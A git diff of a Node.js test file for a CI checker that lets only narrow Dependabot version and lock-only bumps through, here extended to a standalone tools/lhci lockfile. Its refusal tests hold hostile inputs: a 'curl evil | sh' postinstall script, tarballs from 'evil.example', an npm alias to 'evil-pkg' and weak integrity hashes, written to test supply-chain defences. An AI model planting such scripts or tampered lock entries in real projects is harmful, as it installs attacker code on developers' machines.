@@ -1,12 +1,13 @@
 // dependabot-exemption.test.mjs — the narrow Dependabot exception of check-commit-identity.mjs
-// (owner decision 2026-11-15): passes only for Dependabot's own GitHub-signed commits on its branch
-// that only bump existing dependency versions or action pin shas; every refusal case fails. Real git
+// (owner decisions 2026-11-15 and 2026-11-19): passes only for Dependabot's own GitHub-signed
+// commits on its branch that only bump existing dependency versions (root, workspaces, the standalone
+// tools/lhci lock, transitive lock-only updates) or action pin shas; every refusal case fails. Real git
 // in throw-away repos, the GitHub API is a loopback stub (TLDCOST_GITHUB_API), no network.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { execFileSync, spawn } from 'node:child_process';
 import { createServer } from 'node:http';
-import { mkdirSync, mkdtempSync, writeFileSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join, resolve } from 'node:path';
 import {
@@ -17,11 +18,15 @@ import {
   VERSION_SPEC,
   WEB_FLOW,
   apiBase,
+  STANDALONE_LOCK_DIRS,
   diffHunks,
+  lockDir,
+  lockOnlyFinding,
   manifestMatcher,
   packageJsonFinding,
   packageLockFinding,
   pinOnlyDiff,
+  standaloneManifestDir,
 } from './lib/dependabot-exemption.mjs';
 
 const SCRIPT = resolve(import.meta.dirname, 'check-commit-identity.mjs');
@@ -62,6 +67,41 @@ const LOCK = {
     site: { name: 'site', dependencies: { astro: '5.0.0' } },
   },
 };
+/** Lockfile entry from the npm registry: its own tarball, a sha512 integrity (synthetic). */
+const reg = (name, version, extra = {}) => ({
+  version,
+  resolved: `${REG}/${name}/-/${name.split('/').pop()}-${version}.tgz`,
+  integrity: `sha512-${Buffer.from(`${name}@${version}`).toString('base64')}`,
+  dev: true,
+  ...extra,
+});
+// the standalone tools/lhci lock, in the shape of a transitive security update: a proxy agent
+// pulls in an FTP client through get-uri; the update bumps the chain, a major included
+const LHCI = { name: 'lhci', private: true, devDependencies: { '@lhci/cli': '0.16.1' } };
+const LHCI_LOCK = {
+  name: 'lhci',
+  lockfileVersion: 3,
+  requires: true,
+  packages: {
+    '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.1' } },
+    'node_modules/@lhci/cli': reg('@lhci/cli', '0.16.1', {
+      dependencies: { 'proxy-agent': '^8.0.2' },
+    }),
+    'node_modules/proxy-agent': reg('proxy-agent', '8.0.2', {
+      dependencies: { 'get-uri': '8.0.1' },
+    }),
+    'node_modules/get-uri': reg('get-uri', '8.0.1', { dependencies: { 'basic-ftp': '^5.3.1' } }),
+    'node_modules/basic-ftp': reg('basic-ftp', '5.3.1'),
+    'node_modules/quickjs-wasi': reg('quickjs-wasi', '2.2.0'),
+  },
+};
+const LHCI_BUMP = {
+  'node_modules/proxy-agent': reg('proxy-agent', '8.0.3', { dependencies: { 'get-uri': '8.0.2' } }),
+  'node_modules/get-uri': reg('get-uri', '8.0.2', { dependencies: { 'basic-ftp': '^6.2.4' } }),
+  'node_modules/basic-ftp': reg('basic-ftp', '6.2.6'),
+  'node_modules/quickjs-wasi': reg('quickjs-wasi', '3.7.0'),
+};
+const lhciLockWith = (pkgs) => json({ ...LHCI_LOCK, packages: { ...LHCI_LOCK.packages, ...pkgs } });
 const WORKFLOW = `name: X
 on: push
 jobs:
@@ -100,14 +140,21 @@ function repo() {
   write('packages/core/package.json', json({ name: 'core', dependencies: { zod: '^3.0.0' } }));
   write('site/package.json', json(SITE));
   write('other/package.json', json({ name: 'other', dependencies: { zod: '^3.0.0' } }));
+  write('tools/lhci/package.json', json(LHCI));
+  write('tools/lhci/package-lock.json', json(LHCI_LOCK));
+  write('tools/other/package.json', json(LHCI));
+  write('tools/other/package-lock.json', json(LHCI_LOCK));
   write('.github/workflows/ci.yml', WORKFLOW);
   write('README.md', 'x\n');
   g(['add', '-A']);
   g(['commit', '-q', '-m', 'base']);
   const base = g(['rev-parse', 'HEAD']);
-  /** Commit the given file contents as author a / committer c. */
+  /** Commit the given file contents (null: delete the file) as author a / committer c. */
   const commit = (files, a = DEPENDABOT.email, c = WEB_FLOW.email) => {
-    for (const [path, text] of Object.entries(files)) write(path, text);
+    for (const [path, text] of Object.entries(files)) {
+      if (text === null) rmSync(join(dir, path));
+      else write(path, text);
+    }
     g(['add', '-A']);
     g(['commit', '-q', '-m', 'bump'], a, c);
   };
@@ -256,11 +303,7 @@ test('refused: package.json – new dependency, script, other field, non-version
   }
 });
 
-test('refused: package-lock.json alone, resolved outside the npm registry, a moved link', async () => {
-  await refused(
-    { 'package-lock.json': lockWith(bumpedLeftPad) },
-    /package-lock.json changed without a package.json change/,
-  );
+test('refused: package-lock.json resolved outside the npm registry, a moved link', async () => {
   await refused(
     {
       'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
@@ -481,6 +524,149 @@ test('refused: lockfile – sha1 on a new entry, a changed entry without resolve
   );
 });
 
+test('positive: lock-only (transitive) updates of the root lock and the tools/lhci lock pass', async () => {
+  const r = repo();
+  // root lock alone: left-pad 1.0.0 -> 1.3.0 inside the unchanged range ^1.0.0
+  r.commit({ 'package-lock.json': lockWith(bumpedLeftPad) });
+  // tools/lhci lock alone: the transitive chain, a major included, package.json unchanged
+  r.commit({ 'tools/lhci/package-lock.json': lhciLockWith(LHCI_BUMP) });
+  // tools/lhci direct bump: its package.json and its lock together
+  r.commit({
+    'tools/lhci/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }),
+    'tools/lhci/package-lock.json': lhciLockWith({
+      ...LHCI_BUMP,
+      '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
+      'node_modules/@lhci/cli': reg('@lhci/cli', '0.16.2', {
+        dependencies: { 'proxy-agent': '^8.0.3' },
+      }),
+    }),
+  });
+  const res = await check(r);
+  assert.equal(res.code, 0, res.out);
+  assert.match(res.out, /Dependabot exception: 3 commit\(s\)/);
+  assert.equal(res.seen.length, 3);
+  assert.ok(!res.out.includes(TOKEN));
+});
+
+test('refused: tools/lhci lock – foreign URL, wrong package, alias, sha1 or bad integrity', async () => {
+  const re = /tools\/lhci\/package-lock.json: an added or changed package without its own registry/;
+  for (const entry of [
+    // a foreign registry URL
+    { ...reg('basic-ftp', '6.2.6'), resolved: 'https://evil.example/basic-ftp-6.2.6.tgz' },
+    // a mirror that is not registry.npmjs.org
+    {
+      ...reg('basic-ftp', '6.2.6'),
+      resolved: 'https://registry.yarnpkg.com/basic-ftp/-/basic-ftp-6.2.6.tgz',
+    },
+    // right host, wrong package
+    { ...reg('basic-ftp', '6.2.6'), resolved: `${REG}/evil-pkg/-/evil-pkg-6.2.6.tgz` },
+    // an npm alias (npm:evil-pkg@1.0.0 installed under the name basic-ftp)
+    { ...reg('evil-pkg', '1.0.0'), name: 'evil-pkg' },
+    // sha1, a malformed sha512, no integrity
+    { ...reg('basic-ftp', '6.2.6'), integrity: 'sha1-AAAA' },
+    { ...reg('basic-ftp', '6.2.6'), integrity: 'sha512-not base64!' },
+    { ...reg('basic-ftp', '6.2.6'), integrity: undefined },
+  ]) {
+    await refused(
+      {
+        'tools/lhci/package-lock.json': lhciLockWith({
+          ...LHCI_BUMP,
+          'node_modules/basic-ftp': entry,
+        }),
+      },
+      re,
+    );
+  }
+  await refused(
+    {
+      'tools/lhci/package.json': json({
+        ...LHCI,
+        devDependencies: { '@lhci/cli': 'npm:evil-pkg@1.0.0' },
+      }),
+    },
+    /tools\/lhci\/package.json: devDependencies changed beyond the version/,
+  );
+  await refused(
+    { 'tools/lhci/package.json': json({ ...LHCI, scripts: { postinstall: 'curl evil | sh' } }) },
+    /tools\/lhci\/package.json: a top-level field was added or removed/,
+  );
+});
+
+test('refused: lock-only change of a root, workspace or link entry (no package.json change)', async () => {
+  const re = /changed without a package.json change, and a root, workspace or link entry changed/;
+  // root lock: the root entry's spec, a workspace entry, a removed or added link
+  await refused(
+    {
+      'package-lock.json': lockWith({
+        ...bumpedLeftPad,
+        '': { ...LOCK.packages[''], dependencies: { 'left-pad': '^1.3.0' } },
+      }),
+    },
+    re,
+  );
+  await refused(
+    {
+      'package-lock.json': lockWith({
+        site: { name: 'site', dependencies: { astro: '5.1.2' } },
+      }),
+    },
+    re,
+  );
+  const noLink = { ...LOCK.packages };
+  delete noLink['node_modules/site'];
+  await refused({ 'package-lock.json': json({ ...LOCK, packages: noLink }) }, re);
+  await refused(
+    {
+      'package-lock.json': lockWith({
+        'node_modules/core': { resolved: 'packages/core', link: true },
+      }),
+    },
+    re,
+  );
+  // tools/lhci lock: its root entry's spec
+  await refused(
+    {
+      'tools/lhci/package-lock.json': lhciLockWith({
+        ...LHCI_BUMP,
+        '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
+      }),
+    },
+    new RegExp(`tools/lhci/package-lock.json ${re.source}`),
+  );
+  // a root package.json change does not pair with the tools/lhci lock
+  await refused(
+    {
+      'package.json': rootWith({ dependencies: { 'left-pad': '^1.3.0' } }),
+      'tools/lhci/package-lock.json': lhciLockWith({
+        '': { name: 'lhci', devDependencies: { '@lhci/cli': '0.16.2' } },
+      }),
+    },
+    re,
+  );
+});
+
+test('refused: lockfiles outside the list, added or deleted lockfiles', async () => {
+  const outside = /a file outside the manifests and workflow pins/;
+  await refused({ 'tools/other/package-lock.json': lhciLockWith(LHCI_BUMP) }, outside);
+  await refused(
+    { 'tools/other/package.json': json({ ...LHCI, devDependencies: { '@lhci/cli': '0.16.2' } }) },
+    outside,
+  );
+  await refused(
+    { 'tools/lhci/sub/package-lock.json': lhciLockWith(LHCI_BUMP) },
+    /only modified files allowed \(status A\)/,
+  );
+  await refused(
+    { 'tools/lhci/npm-shrinkwrap.json': lhciLockWith(LHCI_BUMP) },
+    /only modified files allowed \(status A\)/,
+  );
+  await refused(
+    { 'tools/lhci/package-lock.json': null },
+    /only modified files allowed \(status D\)/,
+  );
+  await refused({ 'package-lock.json': null }, /only modified files allowed \(status D\)/);
+});
+
 test('helpers: pin lines, pairing, diff parsing, manifests, versions, lock, API base', () => {
   assert.ok(PIN_LINE.test(`      - uses: actions/checkout@${SHA_A} # v7.0.1`));
   assert.ok(PIN_LINE.test(`    uses: org/repo/.github/workflows/x.yml@${SHA_B}`));
@@ -571,4 +757,28 @@ test('helpers: pin lines, pairing, diff parsing, manifests, versions, lock, API 
   }
   assert.equal(apiBase({ TLDCOST_GITHUB_API: 'http://127.0.0.1:1234' }), 'http://127.0.0.1:1234');
   assert.equal(apiBase({}), 'https://api.github.com');
+  // standalone locks: exactly the listed paths
+  assert.deepEqual(STANDALONE_LOCK_DIRS, ['tools/lhci']);
+  assert.equal(lockDir('package-lock.json'), '');
+  assert.equal(lockDir('tools/lhci/package-lock.json'), 'tools/lhci');
+  for (const p of [
+    'tools/other/package-lock.json',
+    'tools/lhci/sub/package-lock.json',
+    'x/tools/lhci/package-lock.json',
+    'tools/lhci/package-lock.json.bak',
+    'site/package-lock.json',
+  ]) {
+    assert.equal(lockDir(p), null, p);
+  }
+  assert.equal(standaloneManifestDir('tools/lhci/package.json'), 'tools/lhci');
+  assert.equal(standaloneManifestDir('tools/other/package.json'), null);
+  assert.equal(standaloneManifestDir('package.json'), null);
+  // lock-only: only node_modules entries (no links) may change
+  assert.equal(lockOnlyFinding(json(LHCI_LOCK), lhciLockWith(LHCI_BUMP)), '');
+  assert.equal(lockOnlyFinding(json(LOCK), lockWith(bumpedLeftPad)), '');
+  assert.match(
+    lockOnlyFinding(json(LOCK), lockWith({ '': { ...LOCK.packages[''], private: true } })),
+    /root, workspace or link entry changed/,
+  );
+  assert.match(lockOnlyFinding('not json', '{}'), /not valid JSON/);
 });
